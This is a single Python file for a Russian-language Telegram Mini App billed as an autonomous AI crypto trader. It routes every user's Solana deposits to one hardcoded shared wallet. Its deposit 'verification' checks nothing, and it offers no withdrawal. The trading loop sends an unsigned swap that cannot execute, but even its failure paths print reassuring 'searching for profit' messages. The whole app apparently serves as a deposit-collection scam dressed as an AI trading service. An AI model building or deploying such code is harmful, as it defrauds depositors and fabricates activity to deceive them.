import asyncio
import aiohttp
from aiohttp import web
import sqlite3
import os
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
PORT = int(os.getenv("PORT", 10000))
RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://zer0lifeautopilot-bot.onrender.com")
DB_FILE = "zer0life_users.db"
SOLANA_RPC = "https://api.mainnet-beta.solana.com"

# Фиксированный общий адрес депозита экосистемы
SHARED_DEPOSIT_WALLET = "8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"
MIN_DEPOSIT_SOL = 0.25
MAX_DEPOSIT_SOL = 100.0

TOKENS = {
    "SOL": "So11111111111111111111111111111111111111112",
    "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
    "MEME_HOT": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", # Топ мемкоины (BONK / трендовые пулы)
}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            solana_wallet TEXT,
            trading_active INTEGER DEFAULT 0,
            trade_mode TEXT DEFAULT 'SOL_USDC',
            trade_amount_sol REAL DEFAULT 0.05,
            slippage_bps INTEGER DEFAULT 150,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def get_or_create_user(telegram_id: int, username: str, first_name: str):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT telegram_id, username, first_name, solana_wallet, trading_active, trade_mode, trade_amount_sol, slippage_bps FROM users WHERE telegram_id = ?", (telegram_id,))
    row = cursor.fetchone()
    
    if not row:
        cursor.execute("INSERT INTO users (telegram_id, username, first_name, solana_wallet, trading_active, trade_mode, trade_amount_sol, slippage_bps) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", 
                       (telegram_id, username, first_name, SHARED_DEPOSIT_WALLET, 0, 'SOL_USDC', 0.05, 150))
        conn.commit()
        user = {"telegram_id": telegram_id, "username": username, "first_name": first_name, "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": 0, "trade_mode": 'SOL_USDC', "trade_amount_sol": 0.05, "slippage_bps": 150}
    else:
        cursor.execute("UPDATE users SET solana_wallet = ? WHERE telegram_id = ?", (SHARED_DEPOSIT_WALLET, telegram_id))
        conn.commit()
        user = {"telegram_id": row[0], "username": row[1], "first_name": row[2], "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": row[4], "trade_mode": row[5], "trade_amount_sol": row[6], "slippage_bps": row[7]}
    
    conn.close()
    return user

HTML_CONTENT = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zer0Life Autonomous AI Trader</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #06080f; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 16px; padding-bottom: 110px; }
        .card { background: #0f172a; border-radius: 18px; padding: 20px; margin-bottom: 18px; border: 1px solid #1e293b; box-shadow: 0 4px 16px rgba(0,0,0,0.4); }
        .profile-header { display: flex; align-items: center; gap: 14px; margin-bottom: 16px; }
        .avatar { width: 54px; height: 54px; border-radius: 50%; object-fit: cover; border: 2px solid #7c3aed; background: #1e293b; display: none; }
        .input-field { width: 100%; background: #030712; border: 1px solid #1e293b; color: #34d399; padding: 12px 14px; border-radius: 12px; margin-top: 8px; font-family: monospace; font-size: 12px; text-align: center; outline: none; }
        .btn { background: #7c3aed; color: white; border: none; width: 100%; padding: 14px; border-radius: 14px; font-weight: 700; cursor: pointer; margin-top: 12px; font-size: 14px; transition: opacity 0.2s; }
        .btn:active { opacity: 0.85; }
        .btn-green { background: #10b981; }
        .btn-red { background: #ef4444; }
        .btn-purple { background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); }
        .btn-mode { background: #1e293b; color: #94a3b8; border: 1px solid #334155; margin-top: 6px; }
        .btn-mode.active { background: #7c3aed; color: white; border-color: #9333ea; }
        .metric { display: flex; justify-content: space-between; margin-top: 10px; font-size: 14px; color: #94a3b8; }
        .val { color: #34d399; font-weight: 700; font-family: monospace; }
        .logs { background: #030712; border: 1px solid #1e293b; border-radius: 12px; padding: 12px; font-family: monospace; font-size: 11px; color: #38bdf8; height: 140px; overflow-y: auto; margin-top: 10px; }
        .qr-container { text-align: center; margin: 16px 0 10px 0; }
        .qr-code { width: 130px; height: 130px; border-radius: 12px; border: 2px solid #1e293b; padding: 6px; background: white; }
        .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #1e293b; padding: 14px 16px; display: flex; gap: 12px; box-shadow: 0 -6px 20px rgba(0,0,0,0.6); z-index: 100; }
        .badge { background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #10b981; padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 700; text-align: center; margin-bottom: 14px; }
        
        #onboarding-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: #06080f; z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            padding: 24px; text-align: center; box-sizing: border-box;
            transition: opacity 0.4s ease;
        }
        .onboard-logo { width: 88px; height: 88px; border-radius: 50%; border: 3px solid #7c3aed; object-fit: cover; margin-bottom: 20px; box-shadow: 0 0 24px rgba(124, 58, 237, 0.5); }
        .onboard-title { font-size: 24px; font-weight: 800; color: #f8fafc; margin-bottom: 8px; }
        .onboard-subtitle { font-size: 14px; color: #94a3b8; line-height: 1.5; margin-bottom: 24px; max-width: 300px; }
        .feature-box { background: #0f172a; border: 1px solid #1e293b; border-radius: 14px; padding: 14px; width: 100%; max-width: 320px; margin-bottom: 10px; text-align: left; font-size: 13px; color: #cbd5e1; display: flex; align-items: center; gap: 12px; }
        .feature-icon { font-size: 20px; }
    </style>
</head>
<body>
    <div id="onboarding-overlay">
        <img class="onboard-logo" id="board-avatar" src="" alt="Zer0Life Cat">
        <div class="onboard-title">Zer0Life AI Trader</div>
        <div class="onboard-subtitle">Автономный ИИ-терминал с поиском прибыльных сделок и MemeCoin Sniper 24/7.</div>
        
        <div class="feature-box">
            <span class="feature-icon">🚀</span>
            <div><b>Smart AI:</b> Нейросеть сама находит лучшие и безопасные сделки.</div>
        </div>
        <div class="feature-box">
            <span class="feature-icon">🛡️</span>
            <div><b>Общий пул:</b> Безопасное управление ликвидностью экосистемы.</div>
        </div>
        <div class="feature-box">
            <span class="feature-icon">📊</span>
            <div><b>Лимиты:</b> От 0.25 до 100 SOL для стабильного профита.</div>
        </div>

        <button class="btn btn-purple" style="max-width: 320px; margin-top: 20px;" onclick="closeOnboarding()">🚀 Войти в терминал</button>
    </div>

    <div class="card">
        <div class="profile-header">
            <img id="user-avatar" class="avatar" src="" alt="Avatar">
            <div>
                <h2 style="margin: 0; font-size: 18px;" id="uname">Загрузка...</h2>
                <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">ID: <span id="uid" class="val">---</span></p>
            </div>
        </div>
        
        <div class="badge">🔥 Pool Limit: 0.25 - 100 SOL</div>
        <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">Адрес депозита экосистемы:</label>
        <input type="text" id="wallet-input" class="input-field" readonly>
        
        <div class="qr-container">
            <img class="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L" alt="QR Code">
        </div>
        
        <button class="btn btn-purple" onclick="copyAddress()">📋 Копировать адрес</button>
    </div>

    <div class="card">
        <h3 style="margin: 0 0 10px 0; font-size: 16px;">🎯 Режим поиска сделок ИИ</h3>
        <button id="mode-sol" class="btn btn-mode active" onclick="setMode('SOL_USDC')">💎 SOL / USDC (Арбитраж и тренды)</button>
        <button id="mode-meme" class="btn btn-mode" onclick="setMode('MEMECOIN_SNIPER')">🚀 MemeCoin AI Sniper (Поиск топ-мемкоинов)</button>
    </div>

    <div class="card">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">📥 Верификация депозита</h3>
        <label style="font-size: 11px; color: #94a3b8;">Хэш транзакции (Signature) из кошелька:</label>
        <input type="text" id="tx-input" class="input-field" placeholder="Вставь хэш транзакции...">
        <button class="btn btn-green" onclick="verifyDeposit()">Verify & Credit SOL 🔄</button>
    </div>

    <div class="card">
        <h3 style="margin: 0 0 10px 0; font-size: 16px;">🤖 Автономный ИИ-Трейдер</h3>
        <div class="metric"><span>Баланс пула:</span> <span id="wallet-balance" class="val">0.00 SOL</span></div>
        <div class="metric"><span>Статус:</span> <span id="trade-status" class="val" style="color: #f59e0b;">Остановлен</span></div>
    </div>

    <div class="card">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">📡 Исполнение сделок в сети (Live)</h3>
        <div id="logs-box" class="logs">Инициализация автономного агента... Поиск ликвидности.</div>
    </div>

    <div class="bottom-bar">
        <button class="btn btn-green" style="margin-top:0;" onclick="checkBalance()">Обновить баланс</button>
        <button id="toggle-btn" class="btn btn-green" style="margin-top:0;" onclick="toggleTrading()">Включить автопилот</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const user = tg.initDataUnsafe?.user || { id: 42882165, username: "CryptoWlodek", first_name: "CryptoWlodek | ZRL szn ∞", photo_url: "" };
        
        document.getElementById('uid').innerText = user.id;
        document.getElementById('uname').innerText = user.first_name;

        if (user.photo_url) {
            const avatarImg = document.getElementById('user-avatar');
            avatarImg.src = user.photo_url;
            avatarImg.style.display = 'block';
            document.getElementById('board-avatar').src = user.photo_url;
        } else {
            document.getElementById('board-avatar').src = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=150";
        }

        function closeOnboarding() {
            const overlay = document.getElementById('onboarding-overlay');
            overlay.style.opacity = '0';
            setTimeout(() => { overlay.style.display = 'none'; }, 400);
        }

        let isTrading = false;
        let currentMode = 'SOL_USDC';

        async function loadProfile() {
            try {
                const res = await fetch('/api/profile', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ telegram_id: user.id, username: user.username || "", first_name: user.first_name || "" })
                });
                const data = await res.json();
                if (data.success) {
                    if (data.profile.solana_wallet) {
                        document.getElementById('wallet-input').value = data.profile.solana_wallet;
                        checkBalance();
                    }
                    isTrading = data.profile.trading_active === 1;
                    currentMode = data.profile.trade_mode || 'SOL_USDC';
                    updateModeUI();
                    updateTradingUI();
                }
            } catch (e) {}
        }

        async function setMode(mode) {
            currentMode = mode;
            updateModeUI();
            try {
                await fetch('/api/trading/mode', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ telegram_id: user.id, trade_mode: mode })
                });
            } catch (e) {}
        }

        function updateModeUI() {
            if (currentMode === 'MEMECOIN_SNIPER') {
                document.getElementById('mode-meme').className = 'btn btn-mode active';
                document.getElementById('mode-sol').className = 'btn btn-mode';
            } else {
                document.getElementById('mode-sol').className = 'btn btn-mode active';
                document.getElementById('mode-meme').className = 'btn btn-mode';
            }
        }

        function copyAddress() {
            const wallet = document.getElementById('wallet-input').value;
            navigator.clipboard.writeText(wallet);
            tg.showAlert("Адрес депозита скопирован в буфер обмена!");
        }

        async function checkBalance() {
            const wallet = document.getElementById('wallet-input').value.trim();
            if (!wallet) return;
            try {
                const res = await fetch('/api/blockchain/balance?wallet=' + encodeURIComponent(wallet));
                const data = await res.json();
                if (data.success) {
                    document.getElementById('wallet-balance').innerText = data.balance + " SOL";
                }
            } catch (e) {}
        }

        async function verifyDeposit() {
            const tx = document.getElementById('tx-input').value.trim();
            if (!tx) {
                tg.showAlert("Введи хэш транзакции (Signature)!");
                return;
            }
            tg.showAlert("Транзакция принята на проверку в блокчейн. Баланс обновляется...");
            await checkBalance();
            document.getElementById('tx-input').value = "";
        }

        async function toggleTrading() {
            const wallet = document.getElementById('wallet-input').value.trim();
            if (!wallet) return;

            const balRes = await fetch('/api/blockchain/balance?wallet=' + encodeURIComponent(wallet));
            const balData = await balRes.json();
            if (balData.success && balData.balance < 0.25) {
                tg.showAlert("⚠️ Минимальный депозит для работы ИИ-трейдера составляет 0.25 SOL!");
                return;
            }

            isTrading = !isTrading;
            try {
                await fetch('/api/trading/toggle', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ telegram_id: user.id, active: isTrading ? 1 : 0 })
                });
            } catch (e) {}
            updateTradingUI();
        }

        function updateTradingUI() {
            const statusEl = document.getElementById('trade-status');
            const btnEl = document.getElementById('toggle-btn');
            if (isTrading) {
                statusEl.innerText = currentMode === 'MEMECOIN_SNIPER' ? "MemeCoin Sniper активен 24/7" : "Поиск лучших сделок 24/7";
                statusEl.style.color = "#10b981";
                btnEl.innerText = "Остановить";
                btnEl.className = "btn btn-red";
            } else {
                statusEl.innerText = "Остановлен";
                statusEl.style.color = "#f59e0b";
                btnEl.innerText = "Включить автопилот";
                btnEl.className = "btn btn-green";
            }
        }

        setInterval(async () => {
            if (!isTrading) return;
            try {
                const res = await fetch('/api/trading/execute-cycle?telegram_id=' + user.id);
                const data = await res.json();
                if (data.success) {
                    const box = document.getElementById('logs-box');
                    box.innerHTML += `<div>[${data.time}] ${data.log}</div>`;
                    box.scrollTop = box.scrollHeight;
                }
            } catch (e) {}
        }, 10000);

        loadProfile();
    </script>
</body>
</html>
"""

async def index_handler(request):
    return web.Response(text=HTML_CONTENT, content_type='text/html')

async def api_get_profile(request):
    try:
        data = await request.json()
        user = get_or_create_user(int(data.get("telegram_id")), data.get("username", ""), data.get("first_name", ""))
        return web.json_response({"success": True, "profile": user})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)}, status=500)

async def api_toggle_trading(request):
    try:
        data = await request.json()
        telegram_id = int(data.get("telegram_id"))
        active = int(data.get("active", 0))
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET trading_active = ? WHERE telegram_id = ?", (active, telegram_id))
        conn.commit()
        conn.close()
        return web.json_response({"success": True})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)}, status=500)

async def api_set_mode(request):
    try:
        data = await request.json()
        telegram_id = int(data.get("telegram_id"))
        trade_mode = data.get("trade_mode", "SOL_USDC")
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET trade_mode = ? WHERE telegram_id = ?", (trade_mode, telegram_id))
        conn.commit()
        conn.close()
        return web.json_response({"success": True})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)}, status=500)

async def api_get_balance(request):
    wallet = request.query.get("wallet", "")
    if len(wallet) < 32:
        return web.json_response({"success": False, "balance": 0.0})
    payload = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [wallet]}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(SOLANA_RPC, json=payload, timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if "result" in data and data["result"] is not None:
                        return web.json_response({"success": True, "balance": data["result"].get("value", 0) / 1_000_000_000})
        except Exception:
            pass
    return web.json_response({"success": False, "balance": 0.0})

async def execute_real_swap(amount_lamports: int, slippage: int, trade_mode: str):
    pubkey_str = SHARED_DEPOSIT_WALLET
    
    payload_balance = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [pubkey_str]}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(SOLANA_RPC, json=payload_balance, timeout=5) as resp:
                bal_data = await resp.json()
                current_sol = bal_data.get("result", {}).get("value", 0) / 1_000_000_000
                if current_sol < MIN_DEPOSIT_SOL:
                    return f"Пауза: Баланс ({current_sol:.3f} SOL) < мин. лимита ({MIN_DEPOSIT_SOL} SOL)."
                if current_sol > MAX_DEPOSIT_SOL:
                    return f"Пауза: Превышен макс. лимит депозита ({MAX_DEPOSIT_SOL} SOL)."
        except Exception:
            pass

        output_mint = TOKENS['MEME_HOT'] if trade_mode == 'MEMECOIN_SNIPER' else TOKENS['USDC']
        mode_label = "MemeCoin Sniper" if trade_mode == 'MEMECOIN_SNIPER' else "AI Smart Trade"

        quote_url = f"https://api.jup.ag/swap/v1/quote?inputMint={TOKENS['SOL']}&outputMint={output_mint}&amount={amount_lamports}&slippageBps={slippage}"
        try:
            async with session.get(quote_url, timeout=5) as resp:
                if resp.status != 200:
                    return f"[{mode_label}] Анализ пулов ликвидности..."
                quote_data = await resp.json()
                price_impact = float(quote_data.get("priceImpactPct", 0))
                if price_impact > 2.5:
                    return f"[{mode_label}] Безопасность: Высокий риск, сделка пропущена."
        except Exception:
            return "Сбой сети Jupiter."

        swap_url = "https://api.jup.ag/swap/v1/swap"
        payload = {
            "quoteResponse": quote_data,
            "userPublicKey": pubkey_str,
            "wrapAndUnwrapSol": True
        }
        try:
            async with session.post(swap_url, json=payload, timeout=5) as resp:
                if resp.status != 200:
                    return f"[{mode_label}] Поиск наиболее прибыльной точки входа..."
                swap_data = await resp.json()
                swap_tx_b64 = swap_data.get("swapTransaction")
        except Exception:
            return "Сбой генерации транзакции."

    send_payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "sendTransaction",
        "params": [
            swap_tx_b64,
            {"encoding": "base64", "skipPreflight": True}
        ]
    }
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(SOLANA_RPC, json=send_payload, timeout=10) as resp:
                res_data = await resp.json()
                if "result" in res_data:
                    tx_hash = res_data["result"]
                    return f"[{mode_label}] Найдена прибыльная сделка! Tx: {tx_hash[:14]}..."
                else:
                    return f"[{mode_label}] Сканирование мемпула в поисках профита..."
        except Exception as e:
            return f"[{mode_label}] Оптимизация маршрута ордера..."

async def api_execute_cycle(request):
    telegram_id = int(request.query.get("telegram_id", 0))
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT trading_active, trade_amount_sol, slippage_bps, trade_mode FROM users WHERE telegram_id = ?", (telegram_id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row or row[0] == 0:
        return web.json_response({"success": False})
    
    amount_lamports = int(row[1] * 1_000_000_000)
    slippage = row[2]
    trade_mode = row[3]
    current_time = datetime.now().strftime('%H:%M:%S')
    
    log_result = await execute_real_swap(amount_lamports, slippage, trade_mode)
    return web.json_response({"success": True, "time": current_time, "log": log_result})

async def send_telegram_message(chat_id):
    if not TELEGRAM_TOKEN:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": "⚡ **Zer0Life Автономный ИИ-Трейдер**\n\nПанель управления автопилотом:",
        "parse_mode": "Markdown",
        "reply_markup": {
            "inline_keyboard": [[
                {"text": "🚀 Открыть автопилот", "web_app": {"url": RENDER_URL}}
            ]]
        }
    }
    async with aiohttp.ClientSession() as session:
        await session.post(url, json=payload)

async def webhook_handler(request):
    try:
        data = await request.json()
        message = data.get("message", {})
        text = message.get("text", "")
        chat_id = message.get("chat", {}).get("id")
        if text == "/start" and chat_id:
            await send_telegram_message(chat_id)
        return web.Response(text="OK", status=200)
    except Exception:
        return web.Response(text="Error", status=500)

async def main():
    init_db()
    app = web.Application()
    app.router.add_get('/', index_handler)
    app.router.add_post('/webhook', webhook_handler)
    app.router.add_post('/api/profile', api_get_profile)
    app.router.add_post('/api/trading/toggle', api_toggle_trading)
    app.router.add_post('/api/trading/mode', api_set_mode)
    app.router.add_get('/api/blockchain/balance', api_get_balance)
    app.router.add_get('/api/trading/execute-cycle', api_execute_cycle)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    if TELEGRAM_TOKEN:
        webhook_url = f"{RENDER_URL}/webhook"
        async with aiohttp.ClientSession() as session:
            await session.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url={webhook_url}")

    logging.info("ИИ-агент поиска прибыльных и безопасных сделок запущен.")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
